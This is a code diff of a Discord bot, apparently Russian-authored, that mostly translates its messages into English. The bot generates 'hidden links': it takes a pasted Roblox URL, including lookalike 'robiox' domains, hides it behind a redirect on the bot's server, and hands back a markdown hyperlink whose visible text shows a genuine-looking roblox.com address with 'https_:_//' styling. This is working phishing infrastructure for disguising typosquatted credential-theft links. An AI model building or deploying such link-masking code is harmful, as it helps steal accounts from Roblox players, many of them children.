@@ -6,32 +6,30 @@ const app = express();
 const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
 const linksDb = {};
 
-// Заглушка для главной страницы (чтобы сервер оставался "теплым")
 app.get('/', (req, res) => {
-    res.send('Бот активен!');
+    res.send('Bot is active!');
 });
 
-// Веб-сервер для обработки редиректов
 app.get('/r/:id', (req, res) => {
     const originalUrl = linksDb[req.params.id];
-    console.log(`🔎 Переход по ID: ${req.params.id}, ссылка: ${originalUrl}`);
+    console.log(`🔎 Redirecting ID: ${req.params.id}, link: ${originalUrl}`);
     if (originalUrl) {
         return res.redirect(originalUrl);
     }
-    res.status(404).send('Ссылка не найдена или истекла');
+    res.status(404).send('Link not found or expired');
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Веб-сервер запущен на порту ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Web server running on port ${PORT}`));
 
-client.once('ready', () => console.log(`✅ Бот ${client.user.tag} готов!`));
+client.once('ready', () => console.log(`✅ Bot ${client.user.tag} is ready!`));
 
 client.on('interactionCreate', async (interaction) => {
     if (interaction.isButton() && interaction.customId === 'create_hyperlink') {
-        const modal = new ModalBuilder().setCustomId('link_modal').setTitle('Создать скрытую ссылку');
+        const modal = new ModalBuilder().setCustomId('link_modal').setTitle('Create Hidden Link');
         const input = new TextInputBuilder()
             .setCustomId('url_input')
-            .setLabel('Вставьте ссылку на Roblox')
+            .setLabel('Paste Roblox link')
             .setStyle(TextInputStyle.Short)
             .setPlaceholder('https://www.roblox.com/...')
             .setRequired(true);
@@ -48,32 +46,32 @@ client.on('interactionCreate', async (interaction) => {
         const shortUrl = `${process.env.BASE_URL}/r/${id}`;
         const visualUrl = url.replace(/https?:\/\/(robiox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/').replace('https://', 'https_:_//');
 
-        // 1. Ответ в канал со смайликом
+        // Ответ в канале
         await interaction.reply({ 
             content: `<a:verify:1513286049638518824> Check your DMs!`, 
             flags: [MessageFlags.Ephemeral] 
         });
 
-        // 2. Отправляем в ЛС двумя сообщениями
+        // Отправка в ЛС
         try {
-            // Первое: Embed с заголовком
+            // Первое сообщение: Заголовок и инструкция
             await interaction.user.send({ 
                 embeds: [{
                     color: 0x274666,
                     title: '🔗 Hyperlink Generated',
-                    description: 'Your link is ready! Click on the code block below to copy it'
+                    description: 'Your link is ready!\n\nClick on the code block below to copy it'
                 }]
             });
 
-            // Второе: Сама ссылка
+            // Второе сообщение: Ссылка
             await interaction.user.send({ 
                 content: `\`[${visualUrl}](${shortUrl})\`` 
             });
 
         } catch (error) {
-            console.error('Не удалось отправить ЛС:', error);
+            console.error('Failed to send DM:', error);
             await interaction.followUp({ 
-                content: `⚠️ Не удалось отправить ЛС. Вот ваша ссылка: \`[${visualUrl}](${shortUrl})\``, 
+                content: `⚠️ Failed to send DM. Here is your link: \`[${visualUrl}](${shortUrl})\``, 
                 flags: [MessageFlags.Ephemeral] 
             });
         }
